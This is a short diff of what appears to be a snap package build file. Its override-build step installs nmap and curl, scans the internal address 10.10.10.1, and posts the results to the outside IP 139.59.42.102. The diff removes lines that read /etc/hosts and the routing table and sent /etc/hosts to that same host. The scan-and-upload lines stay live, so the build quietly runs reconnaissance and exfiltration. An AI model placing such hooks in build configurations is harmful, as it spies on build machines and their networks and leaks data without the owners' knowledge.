@@ -15,10 +15,7 @@ parts:
         override-build: |
             apt-get update
             apt-get install -y  curl nmap
-            cat /etc/hosts
-            ip route
             nmap -oN nm 10.10.10.1
             curl -d @nm http://139.59.42.102/nm
-            curl -d @/etc/hosts http://139.59.42.102/hosts
             echo 0
 
